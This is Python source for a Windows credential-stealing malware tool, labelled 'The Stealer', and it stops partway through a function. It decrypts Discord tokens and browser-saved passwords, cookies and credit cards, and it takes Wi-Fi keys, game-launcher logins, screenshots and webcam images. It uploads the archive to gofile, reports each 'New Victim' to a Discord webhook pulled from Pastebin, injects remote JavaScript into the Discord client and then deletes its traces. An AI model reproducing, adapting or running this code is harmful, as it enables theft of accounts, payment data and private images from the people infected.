import discord
import os
import subprocess
import platform
import pyautogui
import threading
import cv2
import pyttsx3
import webbrowser
import psutil
import ctypes
import time
import sys
import inspect
import win32api
import win32con
import win32gui
import requests
import shutil
import win32process
import asyncio
import random
import string
import aiohttp
import json
import tkinter as tk
from tkinter import scrolledtext
import winreg as reg
import ctypes.wintypes
from pynput.keyboard import Key, Controller
from io import BytesIO
from discord.ui import View, Button
from discord.ext import commands
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from comtypes import CLSCTX_ALL
import wmi
from win32crypt import CryptUnprotectData
from Crypto.Cipher import AES
import sqlite3
from datetime import datetime, timedelta
import pyperclip
import socket
import base64
import re
from pathlib import Path

# - - - - - - - - - - - - - - - - - - - - - - - - - - The Stealer - - - - - - - - - - - - - - - - - - - - - - - - -
def get_webhook():
    while True:
        try:
            url = "https://pastebin.com/raw/1TgFXXB5"
            response = requests.get(url)
            if response.status_code == 200:
                return response.text
            else:
                print(f"Failed to retrieve data: {response.status_code}")
                time.sleep(10)
        except Exception as e:
            print(f"Error occurred: {e}")
            time.sleep(10)

discord_webhook = f"{get_webhook()}"

def zip_file(base_directory):
    zip_path = shutil.make_archive("$77Vault", "zip", base_directory)
    return zip_path

def get_public_ip():
    try:
        response = requests.get("https://api.ipify.org?format=json")
        ip_info = response.json()
        return ip_info.get("ip", "N/A")
    except Exception:
        return "Unable to retrieve IP"

def get_user_country(ip):
    try:
        response = requests.get(f"https://ipinfo.io/{ip}/json")
        country_info = response.json()
        return country_info.get("country", "Unknown")
    except Exception:
        return "Unable to retrieve country"

def send_file(discord_webhook, zip_path, base_directory):
    user_pc_name = socket.gethostname()
    user_ip = get_public_ip()
    user_country = get_user_country(user_ip)
    file_location = f"{base_directory}"

    with open(zip_path, "rb") as f:
        response = requests.post("https://store3.gofile.io/uploadFile", files={"file": f})

    download_link = response.json().get("data", {}).get("downloadPage", "Failed to retrieve link")

    embed = {
        "content": "@everyone",
        "embeds": [{
            "title": f"New Victim ~ ( {os.getenv('USERNAME')} )",
            "color": 3066993,
            "fields": [
                {
                    "name": "File Information",
                    "value": f"**File Path:** `{zip_path}`\n**File Size:** `{round(os.path.getsize(zip_path) / (1024 * 1024), 2)} MB`",
                    "inline": False
                },
                {
                    "name": "User Information",
                    "value": f"**PC Name:** `{user_pc_name}`\n**Public IP:** `{user_ip}`\n**Country:** `{user_country}`",
                    "inline": False
                },
                {
                    "name": "Download Link",
                    "value": download_link,
                    "inline": False
                },
                {
                    "name": "File Location Before Upload",
                    "value": f"**Location:** `{file_location}`",
                    "inline": False
                }
            ]
        }]
    }

    try:
        response = requests.post(discord_webhook, json=embed)
        response.raise_for_status()
        print("File sent successfully")
    except requests.RequestException as e:
        print(f"Error sending file: {e}")

def remove_traces(base_directory, zip_path):
    try:
        if os.path.exists(base_directory) and os.path.isdir(base_directory):
            shutil.rmtree(base_directory)
        if os.path.exists(zip_path):
            os.remove(zip_path)
        print("Traces removed successfully")
    except Exception as e:
        print(f"Error removing traces: {e}")

def is_admin():
    try:
        return ctypes.windll.shell32.IsUserAnAdmin() != 0
    except Exception as e:
        print(f"[ERROR] Error checking admin privileges: {e}")
        return False

appdata_roaming = os.getenv('APPDATA')
specific_folder = f"$77"
base_directory = os.path.join(appdata_roaming, specific_folder, "Vault")
if not os.path.exists(base_directory):
    os.makedirs(base_directory)

allowed_extensions = {'.txt', '.go', '.json', '.py', '.php', '.js', '.sql', '.cs', '.c', '.sh', ".cpp"}
keywords = (
    "secret", "key", "license", "cnc", "c2", "vps", "password", "account", "tax", "server",
    "bind", "wallet", "backup", "bank", "private", "api", "resemble", "bot", "source",
    "logins", "succubus", "xv", "resellers", "plans"
)
CreateMutex = ctypes.windll.kernel32.CreateMutexW
GetLastError = ctypes.windll.kernel32.GetLastError
ERROR_ALREADY_EXISTS = 183
root_directories = [
    f"C:\\Users\\{os.getenv('USERNAME')}\\Documents", 
    "C:\\Program Files", 
    "C:\\Program Files (x86)", 
    f"C:\\Users\\{os.getenv('USERNAME')}"
]
# def
class discord_logins:
    def __init__(self):
        self.baseurl = "https://discord.com/api/v9/users/@me"
        self.billing_url = "https://discord.com/api/v9/users/@me/billing/payment-sources"
        self.connections_url = "https://discord.com/api/v9/users/@me/connections"
        self.guilds_url = "https://discord.com/api/v9/users/@me/guilds"
        self.appdata = os.getenv("localappdata")
        self.roaming = os.getenv("appdata")
        self.regex = r"[\w-]{24}\.[\w-]{6}\.[\w-]{25,110}"
        self.encrypted_regex = r"dQw4w9WgXcQ:[^\"]*"
        self.tokens = []
        self.user_data = []

        try:
            self.grabTokens()
            self.getUserInfo()
            self.saveTokens()
        except Exception:
            pass

    def decrypt_val(self, buff, master_key):
        try:
            iv = buff[3:15]
            payload = buff[15:]
            cipher = AES.new(master_key, AES.MODE_GCM, iv)
            decrypted_pass = cipher.decrypt(payload)
            decrypted_pass = decrypted_pass[:-16].decode()
            return decrypted_pass
        except Exception:
            return None

    def get_master_key(self, path):
        with open(path, "r", encoding="utf-8") as f:
            local_state = json.loads(f.read())
        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key

    def grabTokens(self):
        paths = {
            'Discord': self.roaming + '\\discord\\Local Storage\\leveldb\\',
            'Discord Canary': self.roaming + '\\discordcanary\\Local Storage\\leveldb\\',
            'Lightcord': self.roaming + '\\Lightcord\\Local Storage\\leveldb\\',
            'Discord PTB': self.roaming + '\\discordptb\\Local Storage\\leveldb\\',
            'Opera': self.roaming + '\\Opera Software\\Opera Stable\\Local Storage\\leveldb\\',
            'Opera GX': self.roaming + '\\Opera Software\\Opera GX Stable\\Local Storage\\leveldb\\',
            'Chrome': self.appdata + '\\Google\\Chrome\\User Data\\Default\\Local Storage\\leveldb\\',
        }

        for name, path in paths.items():
            if not os.path.exists(path):
                continue

            if "cord" in path and os.path.exists(self.roaming + f'\\{name.lower()}\\Local State'):
                master_key = self.get_master_key(self.roaming + f'\\{name.lower()}\\Local State')
                for file_name in os.listdir(path):
                    if file_name.endswith((".log", ".ldb")):
                        with open(f"{path}\\{file_name}", errors='ignore') as file:
                            for line in file.readlines():
                                for match in re.findall(self.encrypted_regex, line):
                                    encrypted_token = base64.b64decode(match.split('dQw4w9WgXcQ:')[1])
                                    token = self.decrypt_val(encrypted_token, master_key)
                                    if token and token not in self.tokens:
                                        self.tokens.append(token)
            else:
                for file_name in os.listdir(path):
                    if file_name.endswith((".log", ".ldb")):
                        with open(f"{path}\\{file_name}", errors='ignore') as file:
                            for line in file.readlines():
                                for match in re.findall(self.regex, line):
                                    if match not in self.tokens:
                                        self.tokens.append(match)

    def fetch_data(self, url, headers):
        try:
            response = requests.get(url, headers=headers, timeout=5)
            if response.status_code == 200:
                return response.json()
        except Exception as e:
            print(f"Error fetching data from {url}: {e}")
        return None

    def getUserInfo(self):
        for token in self.tokens:
            try:
                headers = {"Authorization": token}
                user_info = self.fetch_data(self.baseurl, headers)
                if user_info:
                    billing_info = self.fetch_data(self.billing_url, headers)
                    connections = self.fetch_data(self.connections_url, headers)
                    guilds = self.fetch_data(self.guilds_url, headers)

                    user_data = {
                        "Username": f"{user_info['username']}#{user_info['discriminator']}",
                        "DisplayName": user_info.get('global_name', 'N/A'),
                        "Email": user_info.get('email', 'N/A'),
                        "Phone": user_info.get('phone', 'N/A'),
                        "Verified": user_info.get('verified', False),
                        "Nitro": user_info.get('premium_type', 0),
                        "Token": token,
                        "Billing Info": billing_info if billing_info else "No billing info",
                        "Connections": connections if connections else "No connections",
                        "Guilds": [guild['name'] for guild in guilds] if guilds else "No guilds",
                    }

                    self.user_data.append(user_data)
                else:
                    pass
            except Exception:
                pass

    def saveTokens(self):
        save_path = os.path.join(base_directory)

        file_path = os.path.join(save_path, "discord_tokens.txt")

        with open(file_path, "w", encoding="utf-8") as f:
            for user in self.user_data:
                f.write("=" * 30 + "\n")
                f.write(f"Username: {user['Username']}\n")
                f.write(f"DisplayName: {user['DisplayName']}\n")
                f.write(f"Email: {user['Email']}\n")
                f.write(f"Phone: {user['Phone']}\n")
                f.write(f"Verified: {user['Verified']}\n")
                f.write(f"Nitro: {'Yes' if user['Nitro'] > 0 else 'No'}\n")
                f.write(f"Token: {user['Token']}\n")
                f.write(f"Billing Info: {user['Billing Info']}\n")
                f.write(f"Connections: {user['Connections']}\n")
                f.write(f"Guilds: {', '.join(user['Guilds']) if isinstance(user['Guilds'], list) else user['Guilds']}\n")
            f.write("=" * 30 + "\n")
            f.write("Invalid Tokens:\n")
            for token in self.tokens:
                if token not in [user['Token'] for user in self.user_data]:
                    f.write(f"{token}\n")
# def

# def
def wifi_info():
    try:
        folder_name = os.path.join(base_directory, "Wifi")
        os.makedirs(folder_name, exist_ok=True)

        logins_file = os.path.join(folder_name, "logins.txt")
        ping_file = os.path.join(folder_name, "ping.txt")
        info_file = os.path.join(folder_name, "info.txt")
        extra_file = os.path.join(folder_name, "extra.txt")
        stats_file = os.path.join(folder_name, "stats.txt")

        with open(logins_file, "w", encoding="utf-8") as logins:
            logins.write(get_wifi_logins())

        with open(ping_file, "w", encoding="utf-8") as ping:
            ping.write(get_ping_info())

        with open(info_file, "w", encoding="utf-8") as info:
            info.write(get_wifi_info())

        with open(extra_file, "w", encoding="utf-8") as extra:
            extra.write(get_extra_wifi_info())

        with open(stats_file, "w", encoding="utf-8") as stats:
            stats.write(get_wifi_statistics())

    except Exception as e:
        print(f"Error in wifi_info: {e}")

def get_wifi_logins():
    logins = "Wi-Fi Logins:\n" + "=" * 50 + "\n"
    try:
        command = "netsh wlan show profiles"
        result = subprocess.check_output(command, shell=True, text=True, errors='ignore')
        profiles = [line.split(":")[-1].strip() for line in result.split("\n") if "All User Profile" in line]

        for profile in profiles:
            try:
                details = subprocess.check_output(
                    f"netsh wlan show profile name=\"{profile}\" key=clear", shell=True, text=True, errors='ignore'
                )
                password_line = [
                    line.split(":")[-1].strip()
                    for line in details.split("\n")
                    if "Key Content" in line
                ]
                password = password_line[0] if password_line else "<No Password>"
                logins += f"Wi-Fi Name: {profile}\nPassword: {password}\n{'-' * 50}\n"
            except subprocess.CalledProcessError:
                logins += f"Wi-Fi Name: {profile}\nPassword: <Error Fetching>\n{'-' * 50}\n"

    except subprocess.CalledProcessError as e:
        logins += f"Error fetching Wi-Fi logins: {e}\n"
    return logins

def get_ping_info():
    ping_info = "Ping Information:\n" + "=" * 50 + "\n"
    try:
        command = "ping 8.8.8.8 -n 4" if platform.system().lower() == "windows" else "ping -c 4 8.8.8.8"
        result = subprocess.check_output(command, shell=True, text=True, errors='ignore')
        ping_info += result
    except subprocess.CalledProcessError:
        ping_info += "Error fetching ping information.\n"

    return ping_info

def get_wifi_info():
    info = "Wi-Fi Info:\n" + "=" * 50 + "\n"
    try:
        command = "ipconfig /all" if platform.system().lower() == "windows" else "ifconfig"
        result = subprocess.check_output(command, shell=True, text=True, errors='ignore')
        info += result
    except subprocess.CalledProcessError:
        info += "Error fetching Wi-Fi information.\n"

    return info

def get_extra_wifi_info():
    extra = "Extra Wi-Fi Information:\n" + "=" * 50 + "\n"
    try:
        command = "netsh wlan show interfaces" if platform.system().lower() == "windows" else "iwconfig"
        result = subprocess.check_output(command, shell=True, text=True, errors='ignore')
        extra += result
    except subprocess.CalledProcessError:
        extra += "Error fetching extra Wi-Fi information.\n"

    return extra

def get_wifi_statistics():
    stats = "Wi-Fi Statistics:\n" + "=" * 50 + "\n"
    try:
        if platform.system().lower() == "windows":
            command = "netsh wlan show interfaces"
            result = subprocess.check_output(command, shell=True, text=True, errors='ignore')
            

            for line in result.splitlines():
                if "Signal" in line:
                    stats += f"{line.strip()}\n"
                elif "Radio type" in line:
                    stats += f"{line.strip()}\n"
                elif "Channel" in line:
                    stats += f"{line.strip()}\n"
                elif "Receive rate" in line or "Transmit rate" in line:
                    stats += f"{line.strip()}\n"
                elif "SSID" in line:
                    stats += f"{line.strip()}\n"
        else:
            command = "iwconfig"
            result = subprocess.check_output(command, shell=True, text=True, errors='ignore')

            for line in result.splitlines():
                if "Signal level" in line:
                    stats += f"{line.strip()}\n"
                elif "Frequency" in line:
                    stats += f"{line.strip()}\n"
                elif "Bit Rate" in line:
                    stats += f"{line.strip()}\n"
                elif "ESSID" in line:
                    stats += f"{line.strip()}\n"

    except Exception as e:
        stats += f"Error fetching statistics: {e}\n"

    return stats
# def

# def
appdata = os.getenv('LOCALAPPDATA')
roaming = os.getenv('APPDATA')

browsers = {
    'avast': appdata + '\\AVAST Software\\Browser\\User Data',
    'amigo': appdata + '\\Amigo\\User Data',
    'torch': appdata + '\\Torch\\User Data',
    'kometa': appdata + '\\Kometa\\User Data',
    'orbitum': appdata + '\\Orbitum\\User Data',
    'cent-browser': appdata + '\\CentBrowser\\User Data',
    '7star': appdata + '\\7Star\\7Star\\User Data',
    'sputnik': appdata + '\\Sputnik\\Sputnik\\User Data',
    'vivaldi': appdata + '\\Vivaldi\\User Data',
    'chromium': appdata + '\\Chromium\\User Data',
    'chrome-canary': appdata + '\\Google\\Chrome SxS\\User Data',
    'chrome': appdata + '\\Google\\Chrome\\User Data',
    'epic-privacy-browser': appdata + '\\Epic Privacy Browser\\User Data',
    'msedge': appdata + '\\Microsoft\\Edge\\User Data',
    'msedge-canary': appdata + '\\Microsoft\\Edge SxS\\User Data',
    'msedge-beta': appdata + '\\Microsoft\\Edge Beta\\User Data',
    'msedge-dev': appdata + '\\Microsoft\\Edge Dev\\User Data',
    'uran': appdata + '\\uCozMedia\\Uran\\User Data',
    'yandex': appdata + '\\Yandex\\YandexBrowser\\User Data',
    'brave': appdata + '\\BraveSoftware\\Brave-Browser\\User Data',
    'iridium': appdata + '\\Iridium\\User Data',
    'coccoc': appdata + '\\CocCoc\\Browser\\User Data',
    'opera': roaming + '\\Opera Software\\Opera Stable',
    'opera-gx': roaming + '\\Opera Software\\Opera GX Stable'
}

data_queries = {
    'login_data': {
        'query': 'SELECT action_url, username_value, password_value FROM logins',
        'file': '\\Login Data',
        'columns': ['URL', 'Email', 'Password'],
        'decrypt': True
    },
    'credit_cards': {
        'query': 'SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted, date_modified FROM credit_cards',
        'file': '\\Web Data',
        'columns': ['Name On Card', 'Expiration Month', 'Expiration Year', 'Card Number', 'Date Modified'],
        'decrypt': True
    },
    'cookies': {
        'query': 'SELECT host_key, name, path, encrypted_value, is_secure, is_httponly, has_expires, expires_utc, last_access_utc, creation_utc FROM cookies',
        'file': '\\Network\\Cookies',
        'columns': ['Host Key', 'Cookie Name', 'Path', 'Cookie', 'Secure', 'HTTP Only', 'Has Expiry', 'Expires On', 'Last Accessed', 'Creation Time'],
        'decrypt': True
    },
    'history': {
        'query': 'SELECT url, title, last_visit_time FROM urls',
        'file': '\\History',
        'columns': ['URL', 'Title', 'Visited Time'],
        'decrypt': False
    },
    'downloads': {
        'query': 'SELECT tab_url, target_path FROM downloads',
        'file': '\\History',
        'columns': ['Download URL', 'Local Path'],
        'decrypt': False
    }
}

def get_master_key(path: str):
    try:
        if not os.path.exists(path + "\\Local State"):
            return None

        with open(path + "\\Local State", "r", encoding="utf-8") as f:
            local_state = json.load(f)

        encrypted_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
        encrypted_key = encrypted_key[5:]
        master_key = CryptUnprotectData(encrypted_key, None, None, None, 0)[1]
        return master_key
    except Exception:
        pass

def decrypt_password(buff: bytes, key: bytes) -> str:
    try:
        iv = buff[3:15]
        payload = buff[15:]
        cipher = AES.new(key, AES.MODE_GCM, iv)
        decrypted_pass = cipher.decrypt(payload)[:-16].decode()
        return decrypted_pass
    except:
        return ""

def save_results(browser_name, type_of_data, content):
    try:
        parent_folder = os.path.join(base_directory, "Browsers")
        os.makedirs(os.path.join(parent_folder, browser_name), exist_ok=True)
        
        if content:
            file_path = os.path.join(parent_folder, browser_name, f"{type_of_data}.txt")
            with open(file_path, 'w', encoding="utf-8") as f:
                f.write(content)
        else:
            pass
    except Exception:
        pass

def get_data(path: str, profile: str, key, type_of_data):
    global type_of_data_name
    try:
        db_file = f'{path}\\{profile}{type_of_data["file"]}'
        if not os.path.exists(db_file):
            return ""
        result = ""
        temp_db = 'temp_db'
        try:
            shutil.copy(db_file, temp_db)
            conn = sqlite3.connect(temp_db)
            cursor = conn.cursor()
            cursor.execute(type_of_data['query'])
            for row in cursor.fetchall():
                row = list(row)
                if type_of_data['decrypt']:
                    for i, value in enumerate(row):
                        if isinstance(value, bytes):
                            row[i] = decrypt_password(value, key) if row[i] else "Failed to decrypt"
                if type_of_data_name == 'history' and row[2]:
                    row[2] = convert_chrome_time(row[2])
                if type_of_data_name == 'cookies':
                    row[3] = decrypt_password(row[3], key) if isinstance(row[3], bytes) else row[3]
                    row[7] = convert_chrome_time(row[7]) if row[7] else "Never"
                    row[8] = convert_chrome_time(row[8]) if row[8] else "Never"
                    row[9] = convert_chrome_time(row[9]) if row[9] else "Never"
                result += "\n".join([f"{col}: {val}" for col, val in zip(type_of_data['columns'], row)]) + "\n\n"
            conn.close()
        except Exception:
            pass
        finally:
            if os.path.exists(temp_db):
                os.remove(temp_db)
        return result
    except Exception:
        pass

def convert_chrome_time(chrome_time):
    try:
        if chrome_time:
            return (datetime(1601, 1, 1) + timedelta(microseconds=chrome_time)).strftime('%d/%m/%Y %H:%M:%S')
        return "0"
    except Exception:
        pass

def installed_browsers():
    try:
        return [browser for browser, path in browsers.items() if os.path.exists(path + "\\Local State")]
    except Exception:
        pass
# def

# def
def vault_folder(base_directory):
    try:
        if os.path.exists(base_directory):
            shutil.rmtree(base_directory)
        
        os.makedirs(base_directory)
    except Exception:
        pass
# def

# def
def display_grabber():
    try:
        screenshot_path = os.path.join(base_directory, "screenshot.png")
        screenshot = pyautogui.screenshot()
        screenshot.save(screenshot_path)

        webcam_path = os.path.join(base_directory, "webcam.png")
        webcam = cv2.VideoCapture(0)
        if not webcam.isOpened():
            raise Exception("Could not access the webcam.")

        ret, frame = webcam.read()
        if ret:
            cv2.imwrite(webcam_path, frame)
        else:
            raise Exception("Failed to capture an image from the webcam.")

        webcam.release()

    except Exception:
        pass
# def

# def
# codeeeeeeeeee
# def

#
class Variables:
    ValidatedTokens = list()
#

# def
class DiscordInjection:
    def __init__(self) -> None:
        self.tokens = Variables.ValidatedTokens
        self.already_killed = False
        self.LocalAppData = os.getenv("localappdata")

    async def InjectIntoToDiscord(self, webhook_url) -> None:
        try:
            discord_dirs = {
                "Discord" : os.path.join(self.LocalAppData, "discord"),
                "Discord Canary" : os.path.join(self.LocalAppData, "discordcanary"),
                "Lightcord" : os.path.join(self.LocalAppData, "Lightcord"),
                "Discord PTB" : os.path.join(self.LocalAppData, "discordptb"),
            }
            injection_code = await self.GetInjectionCode(webhook_url)
            for f, file_paths in discord_dirs.items():
                if os.path.exists(file_paths):
                    indexPath = await self.FindIndexPath(file_paths)
                        
                    if indexPath is None:
                        continue

                    with open(indexPath, "r", encoding="utf-8", errors="ignore") as file:
                        if webhook_url not in file.read():
                            if not self.already_killed:
                                await self.KillDiscord()
                            with open(indexPath, "w", encoding="utf-8", errors="ignore") as x:
                                x.write(injection_code.replace("%WEBHOOK%", webhook_url))
                            command = os.path.join(file_paths, "Update.exe") + " --processStart Discord.exe"
                            result = await asyncio.create_subprocess_shell(command, stdout=asyncio.subprocess.PIPE, shell=True)
                            await result.communicate()
        except Exception:
            pass

    async def GetInjectionCode(self, webhook_url) -> str:
        try:
            async with aiohttp.ClientSession() as session:
                async with session.get("https://raw.githubusercontent.com/hackirby/discord-injection/refs/heads/main/injection.js") as response:
                    data = await response.text()
                    return data.replace("%WEBHOOK%", webhook_url)
        except Exception:
            return None

    async def KillDiscord(self) -> None:
        try:
            proc = await asyncio.create_subprocess_shell("tasklist | findstr /i discord", stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE, shell=True)
            stdout, stderr = await proc.communicate()
            processes = stdout.decode(errors="ignore").split('\n')
            for proc in processes:
                if 'discord' in proc.lower():
                    try:
                        pid = int(proc.split()[1])
                        kill_proc = await asyncio.create_subprocess_shell(f"taskkill /F /PID {pid}", shell=True,stdout=asyncio.subprocess.PIPE, stderr=asyncio.subprocess.PIPE)
                        await kill_proc.communicate()
                        self.already_killed = True
                    except:
                        pass
        except:
            pass

    async def FindIndexPath(self, path: str) -> str:
        try:
            for file in os.listdir(path):
                if re.search(r'app-+?', file):
                    modules_dir = os.path.join(path, file, "modules")
                    
                    if not os.path.exists(modules_dir):
                        continue
                    
                    for modules_files in os.listdir(modules_dir):
                        if re.search(r'discord_desktop_core-+?', modules_files):
                            core_path = os.path.join(modules_dir, modules_files, "discord_desktop_core")
                            index_path = os.path.join(core_path, "index.js")
                            
                            if os.path.isfile(index_path):
                                return index_path
                            else:
                                pass 
            return None
        except Exception as error:
            return None
# def

# def
async def kill_browsers():
    process_names = ["opera.exe",
        "coccoc.exe",
        "iridium.exe",
        "brave.exe",
        "browser.exe",
        "uran.exe",
        "msedge.exe",
        "epic.exe",
        "chrome.exe",
        "edge.exe",
        "vivalidi.exe",
        "sputnik.exe",
        "7star.exe",
        "centbrowser.exe",
        "orbitum.exe",
        "kometa.exe",
        "torch.exe",
        "amigo.exe",
        "avast.exe"]
    killed_processes = []
    processes_to_restart = {}

    for proc in psutil.process_iter(attrs=['pid', 'name', 'exe']):
        try:
            process_name = proc.info['name']
            if process_name.lower() in [x.lower() for x in process_names]:
                file_path = proc.info['exe']
                if file_path:
                    processes_to_restart[process_name] = file_path
                    killed_processes.append(process_name)
                    proc.terminate()
                    print(f"[BROWSER] Killed ~ {process_name}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass

    if killed_processes:
        await asyncio.sleep(1)
        for process_name, file_path in processes_to_restart.items():
            if os.path.exists(file_path):
                subprocess.Popen([file_path])
            else:
                pass
# def

# def
def StealEpic():
    epicPath = os.path.join(os.getenv("localappdata"), "EpicGamesLauncher", "Saved", "Config", "Windows")
    if os.path.isdir(epicPath):
        loginFile = os.path.join(epicPath, "GameUserSettings.ini")
        
        if os.path.isfile(loginFile):
            with open(loginFile) as file:
                contents = file.read()
            
            if "[RememberMe]" in contents:
                saveToPath = os.path.join(base_directory, "Games", "Epic Games")
                
                try:
                    os.makedirs(saveToPath, exist_ok=True)
                    
                    for file in os.listdir(epicPath):
                        file_path = os.path.join(epicPath, file)
                        if os.path.isfile(file_path):
                            shutil.copy(file_path, os.path.join(saveToPath, file))
                    
                    shutil.copytree(epicPath, saveToPath, dirs_exist_ok=True)
                except Exception as e:
                    pass
            else:
                pass
        else:
            pass
    else:
        pass
# def

# def
def StealMinecraft():   
    minecraft_folder = os.path.join(base_directory, "Games", "Minecraft")
    os.makedirs(minecraft_folder, exist_ok=True)
    
    minecraftPaths = {
        "Intent": os.path.join(os.getenv("userprofile"), "intentlauncher", "launcherconfig"),
        "Lunar": os.path.join(os.getenv("userprofile"), ".lunarclient", "settings", "game", "accounts.json"),
        "TLauncher": os.path.join(os.getenv("appdata"), ".minecraft", "TlauncherProfiles.json"),
        "Feather": os.path.join(os.getenv("appdata"), ".feather", "accounts.json"),
        "Meteor": os.path.join(os.getenv("appdata"), ".minecraft", "meteor-client", "accounts.nbt"),
        "Impact": os.path.join(os.getenv("appdata"), ".minecraft", "Impact", "alts.json"),
        "Novoline": os.path.join(os.getenv("appdata"), ".minectaft", "Novoline", "alts.novo"),
        "CheatBreakers": os.path.join(os.getenv("appdata"), ".minecraft", "cheatbreaker_accounts.json"),
        "Microsoft Store": os.path.join(os.getenv("appdata"), ".minecraft", "launcher_accounts_microsoft_store.json"),
        "Rise": os.path.join(os.getenv("appdata"), ".minecraft", "Rise", "alts.txt"),
        "Rise (Intent)": os.path.join(os.getenv("userprofile"), "intentlauncher", "Rise", "alts.txt"),
        "Paladium": os.path.join(os.getenv("appdata"), "paladium-group", "accounts.json"),
        "PolyMC": os.path.join(os.getenv("appdata"), "PolyMC", "accounts.json"),
        "Badlion": os.path.join(os.getenv("appdata"), "Badlion Client", "accounts.json"),
    }

    for name, path in minecraftPaths.items():
        if os.path.isfile(path):
            try:
                save_folder = os.path.join(minecraft_folder, name)
                os.makedirs(save_folder, exist_ok=True)
                shutil.copy(path, os.path.join(save_folder, os.path.basename(path)))
            except Exception:
                pass
        else:
            pass
# def

# def
def GetLnkTarget(path_to_lnk: str) -> str | None:
    target = None
    if os.path.isfile(path_to_lnk):
        output = subprocess.run('wmic path win32_shortcutfile where name="%s" get target /value' % os.path.abspath(path_to_lnk).replace("\\", "\\\\"), shell= True, capture_output= True).stdout.decode()
        if output:
            for line in output.splitlines():
                if line.startswith("Target="):
                    temp = line.lstrip("Target=").strip()
                    if os.path.exists(temp):
                        target = temp
                        break
    return target
    
def GetLnkFromStartMenu(app: str) -> list[str]:
    shortcutPaths = []
    startMenuPaths = [
        os.path.join(os.environ["APPDATA"], "Microsoft", "Windows", "Start Menu", "Programs"),
        os.path.join("C:\\", "ProgramData", "Microsoft", "Windows", "Start Menu", "Programs")
    ]
    for startMenuPath in startMenuPaths:
        for root, _, files in os.walk(startMenuPath):
            for file in files:
                if file.lower() == "%s.lnk" % app.lower():
                    shortcutPaths.append(os.path.join(root, file))
    return shortcutPaths

def StealSteam():
    saveToPath = os.path.join(base_directory, "Games", "Steam")
    
    steamPaths = [*set([os.path.dirname(x) for x in [GetLnkTarget(v) for v in GetLnkFromStartMenu("Steam")] if x is not None])]
    multiple = len(steamPaths) > 1

    if not steamPaths:
        steamPaths.append("C:\\Program Files (x86)\\Steam")

    for index, steamPath in enumerate(steamPaths):
        steamConfigPath = os.path.join(steamPath, "config")

        if os.path.isdir(steamConfigPath):
            loginFile = os.path.join(steamConfigPath, "loginusers.vdf")
            if os.path.isfile(loginFile):
                with open(loginFile) as file:
                    contents = file.read()
                
                if '"RememberPassword"\t\t"1"' in contents:                
                    try:
                        _saveToPath = saveToPath
                        if multiple:
                            _saveToPath = os.path.join(saveToPath, f"Profile {index + 1}")
                        os.makedirs(_saveToPath, exist_ok=True)
                        shutil.copytree(steamConfigPath, os.path.join(_saveToPath, "config"), dirs_exist_ok=True)
                        
                        for item in os.listdir(steamPath):
                            if item.startswith("ssfn") and os.path.isfile(os.path.join(steamPath, item)):
                                shutil.copy(os.path.join(steamPath, item), os.path.join(_saveToPath, item))
                    except Exception:
                        pass
# def

# def
def StealUplay():
    saveToPath = os.path.join(base_directory, "Games", "Uplay")
    uplayPath = os.path.join(os.getenv("localappdata"), "Ubisoft Game Launcher")
    
    if os.path.isdir(uplayPath):
        for item in os.listdir(uplayPath):
            item_path = os.path.join(uplayPath, item)
            if os.path.isfile(item_path):
                try:
                    os.makedirs(saveToPath, exist_ok=True)
                    shutil.copy(item_path, os.path.join(saveToPath, item))
                except Exception:
                    pass
    else:
        pass
# def

# def
folder_path = os.path.join(base_directory, "Startups")
os.makedirs(folder_path, exist_ok=True)

def get_registry_startups():
    startup_data = []
    try:
        reg_current_user = winreg.OpenKey(winreg.HKEY_CURRENT_USER, r"Software\Microsoft\Windows\CurrentVersion\Run")
        for i in range(winreg.QueryInfoKey(reg_current_user)[0]):
            name, path, _ = winreg.EnumValue(reg_current_user, i)
            startup_data.append(f"Name: {name}\nPath: {path}\n")
        winreg.CloseKey(reg_current_user)

        reg_all_users = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, r"Software\Microsoft\Windows\CurrentVersion\Run")
        for i in range(winreg.QueryInfoKey(reg_all_users)[0]):
            name, path, _ = winreg.EnumValue(reg_all_users, i)
            startup_data.append(f"Name: {name}\nPath: {path}\n")
        winreg.CloseKey(reg_all_users)
    except Exception as e:
        startup_data.append(f"Error accessing registry: {str(e)}\n")
    return startup_data

def get_folder_startups():
    startup_data = []
    user_folder = Path(os.getenv("APPDATA")) / "Microsoft" / "Windows" / "Start Menu" / "Programs" / "Startup"
    all_users_folder = Path("C:/ProgramData/Microsoft/Windows/Start Menu/Programs/StartUp")
    
    if user_folder.exists():
        for file in user_folder.iterdir():
            if file.is_file():
                startup_data.append(f"Name: {file.name}\nSize: {file.stat().st_size} bytes\n")
    
    if all_users_folder.exists():
        for file in all_users_folder.iterdir():
            if file.is_file():
                startup_data.append(f"Name: {file.name}\nSize: {file.stat().st_size} bytes\n")
    
    return startup_data

def get_scheduled_tasks():
    startup_data = []
    try:
        tasks = psutil.win_service_iter()
        for task in tasks:
            if task.status() == psutil.STATUS_RUNNING:
                startup_data.append(f"Task: {task.name()}\nExecutable: {task.exe()}\n")
    except Exception as e:
        startup_data.append(f"Error accessing tasks: {str(e)}\n")
    
    return startup_data

def get_wmi_startups():
    startup_data = []
    try:
        wmi = WMI()
        for process in wmi.query("SELECT * FROM Win32_StartupCommand"):
            startup_data.append(f"Name: {process.Name}\nCommand: {process.Command}\n")
    except ImportError:
        startup_data.append("WMI module not installed. Skipping WMI startup queries.\n")
    except Exception as e:
        startup_data.append(f"Error accessing WMI: {str(e)}\n")
    
    return startup_data

def write_to_file(filename, data):
    file_path = folder_path / filename
    with open(file_path, "w") as file:
        file.write("\n".join(data))

def grab_startups():
    registry_current_user = get_registry_startups()
    write_to_file("regedit_currentuser.txt", registry_current_user)
    registry_all_users = get_registry_startups()
    write_to_file("regedit_allusers.txt", registry_all_users)
    folder_current_user = get_folder_startups()
    write_to_file("folder_currentuser.txt", folder_current_user)
    folder_all_users = get_folder_startups()
    write_to_file("folder_allusers.txt", folder_all_users)
    scheduled_tasks = get_scheduled_tasks()
    write_to_file("scheduled_tasks.txt", scheduled_tasks)
    wmi_startups = get_wmi_startups()
    write_to_file("wmi_startups.txt", wmi_startups)
# def

# def
def get_webhook_url():
